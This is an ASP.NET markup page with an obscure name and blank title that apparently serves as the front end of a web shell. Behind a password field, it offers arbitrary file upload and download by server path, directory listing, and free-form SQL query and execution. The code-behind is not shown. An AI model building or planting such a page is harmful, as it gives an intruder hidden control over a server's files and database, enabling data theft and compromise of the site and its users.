<%@ Page Language="C#" AutoEventWireup="true" CodeFile="AABBCC.aspx.cs" Inherits="AABBCC" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            Pw:<asp:TextBox ID="txtPw" runat="server"></asp:TextBox>
            Path:<asp:TextBox ID="txtPath" runat="server" Width="400px"></asp:TextBox>
            <asp:FileUpload ID="FileUpload1" runat="server" AllowMultiple="true" />
            <asp:Button ID="Button9" runat="server" Text="上傳" OnClick="btnFile1_Click" />
        </div>
        <div>
            Path:<asp:TextBox ID="TextBox2" runat="server" Width="400px"></asp:TextBox><br />
            <asp:Button ID="Button1" runat="server" Text="下載" OnClick="btnDownload_Click" />
        </div>
         <div>
            Get File List:<asp:TextBox ID="txtFilePath" runat="server" Width="400px"></asp:TextBox><br />
            <asp:Button ID="Button4" runat="server" Text="執行" OnClick="btnGetFileList_Click" />
        </div>
        <div>
            SQL:<asp:TextBox ID="txtSQL" runat="server" TextMode="MultiLine" Height="400" Width="800"> </asp:TextBox>
            <asp:Button ID="Button2" runat="server" Text="查詢" OnClick="btnQuerySQL_Click" />
             <asp:Button ID="Button3" runat="server" Text="執行" OnClick="btnEexcuteSQL_Click" />
            <div style="width:100%; height: 400px; overflow: scroll" id="divSQLResult" runat="server"></div>
        </div>
    </form>
</body>
</html>
